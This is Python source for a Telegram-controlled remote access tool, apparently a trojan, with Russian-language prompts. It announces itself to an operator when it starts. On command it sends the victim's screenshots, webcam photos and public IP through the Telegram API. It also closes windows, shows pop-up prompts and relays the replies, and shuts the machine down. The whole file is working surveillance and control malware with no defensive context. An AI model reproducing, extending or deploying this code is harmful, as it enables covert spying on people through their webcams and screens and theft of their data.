import telebot
from telebot import types
import requests
import cv2
import ctypes
import pyautogui as pag
import platform as pf
import os
import clipboard
import time
 
TOKEN = "token from @BotFather ; токен из @BotFather"
CHAT_ID = "id from @ShowJsonBot ; id из @ShowJsonBot"
client = telebot.TeleBot(TOKEN)
 
requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text=Online")
 
 
@client.message_handler(commands=["start"])
def start(message):
    rmk = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btns = ["/ip","/AltF4","/input","/message" ,
            "/skrin","/off","/webcam"]

    for btn in btns:
        rmk.add(types.KeyboardButton(btn))
 
    client.send_message(message.chat.id, "Выберите действие:", reply_markup=rmk)


@client.message_handler(commands=["ip", "ip_address"])
def ip_address(message):
    response = requests.get("http://jsonip.com/").json()
    client.send_message(message.chat.id, f"IP Address: {response['ip']}")



@client.message_handler(commands=["AltF4","altf4","af4"])
def ffore(message):
    pag.hotkey('Alt', 'F4')
    

 
@client.message_handler(commands=["skrin"])
def screenshot(message):
    pag.screenshot("000.jpg")
 
    with open("000.jpg", "rb") as img:
        client.send_photo(message.chat.id, img)

'''
@client.message_handler(commands=["Win","win+d","win d","wind"])
def winde(message):
    pag.click(1919, 1079)
    time.sleep(1)
    #pag.click()
'''



@client.message_handler(commands=["message"])
def message_sending(message):
    msg = client.send_message(message.chat.id, "Введите ваше сообщение, которое желаете вывести на экран.")
    client.register_next_step_handler(msg, next_message_sending)

def next_message_sending(message):
    try:
        pag.alert(message.text, "~")
    except Exception:
        client.send_message(message.chat.id, "Что-то пошло не так...")




@client.message_handler(commands=["input"])
def message_sending_with_input(message):
    msg = client.send_message(message.chat.id, "Введите ваше сообщение, которое желаете вывести на экран.")
    client.register_next_step_handler(msg, next_message_sending_with_input)
 
 
def next_message_sending_with_input(message):
    try:
        answer = pag.prompt(message.text, "~")
        client.send_message(message.chat.id, answer)
    except Exception:
        client.send_message(message.chat.id, "Что-то пошло не так...")



@client.message_handler(commands=["off"])
def offko(message):
    os.system("shutdown /p")


'''
@client.message_handler(commands=["contrA"])
def conA(message):
    pag.hotkey("ctrl","A")
'''

'''
@client.message_handler(commands=[win])
def wi(message):
    pag.keyUp('Win')
'''

@client.message_handler(commands=["webcam"])
def webcam(message):
    cap = cv2.VideoCapture(0)
 
    for i in range(30):
        cap.read()
 
    ret, frame = cap.read()
 
    cv2.imwrite("cam.jpg", frame)
    cap.release()
 
    with open("cam.jpg", "rb") as img:
        client.send_photo(message.chat.id, img)


client.polling()